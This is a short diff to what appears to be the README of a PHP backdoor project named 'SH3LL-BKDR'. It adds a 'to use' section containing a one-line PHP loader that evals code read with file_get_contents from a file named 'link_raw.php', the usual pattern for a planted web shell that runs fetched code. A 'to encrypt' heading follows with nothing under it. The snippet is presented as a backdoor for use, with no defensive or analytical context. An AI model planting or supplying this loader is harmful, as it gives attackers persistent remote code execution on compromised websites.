@@ -1,7 +1,7 @@
-# SH3LL-BKDR
+## SH3LL-BKDR
 
-
-
-
-
-ya
+### to use
+```
+<?php eval("?>".file_get_contents("link_raw.php"));?>
+```
+### to encrypt
